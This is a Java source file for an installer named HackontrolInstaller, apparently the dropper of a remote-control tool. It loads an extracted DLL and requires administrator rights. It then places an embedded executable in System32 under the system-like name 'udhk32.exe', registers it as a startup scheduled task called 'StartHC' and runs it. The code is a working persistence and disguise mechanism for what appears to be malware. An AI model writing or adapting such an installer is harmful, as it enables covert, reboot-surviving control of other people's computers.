package com.khopan.hackontrol.installer;

import java.io.File;

import javax.swing.JOptionPane;
import javax.swing.UIManager;

import com.khopan.hackontrol.installer.nativelib.Administrator;
import com.khopan.hackontrol.installer.nativelib.TaskScheduler;
import com.khopan.hackontrol.installer.resources.Resources;

public class HackontrolInstaller {
	private static final String NATIVE_LIBRARY = "hckinst.dll";
	private static final String UPDATER = "udhk32.exe";

	private static boolean SetUI;

	public static void main(String[] args) {
		File home = new File(System.getProperty("user.home"));

		if(!home.exists()) {
			HackontrolInstaller.error("Directory '" + home.getAbsolutePath() + "' not found");
			return;
		}

		File nativeLibrary = new File(home, HackontrolInstaller.NATIVE_LIBRARY);
		Resources.paste("installer.dll", nativeLibrary);
		System.load(nativeLibrary.getAbsolutePath());

		if(!Administrator.hasAdministratorPrivileges()) {
			HackontrolInstaller.error("This app requires an administrator privileges to run");
			return;
		}

		String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			HackontrolInstaller.error("Could not find the windows directory");
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			HackontrolInstaller.error("Could not find the windows directory");
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			HackontrolInstaller.error("Directory '" + system32Directory.getAbsolutePath() + "' not found");
			return;
		}

		File updater = new File(system32Directory, HackontrolInstaller.UPDATER);
		Resources.paste("updater.exe", updater);

		if(!TaskScheduler.registerTask("StartHC", updater.getAbsolutePath())) {
			HackontrolInstaller.error("Failed to register startup task");
			return;
		}

		HackontrolInstaller.message("Hackontrol successfully installed on your machine");

		try {
			ProcessBuilder builder = new ProcessBuilder(HackontrolInstaller.UPDATER);
			builder.directory(system32Directory);
			builder.start().getInputStream().readAllBytes();
		} catch(Throwable ignored) {

		}
	}

	private static void ui() {
		if(!HackontrolInstaller.SetUI) {
			HackontrolInstaller.SetUI = true;

			try {
				UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
			} catch(Throwable ignored) {

			}
		}
	}

	private static void message(String message) {
		HackontrolInstaller.ui();
		JOptionPane.showMessageDialog(null, message, "Hackontrol Installer", JOptionPane.INFORMATION_MESSAGE);
	}

	private static void error(String message) {
		HackontrolInstaller.ui();
		JOptionPane.showMessageDialog(null, message, "Hackontrol Installer", JOptionPane.ERROR_MESSAGE);
	}
}
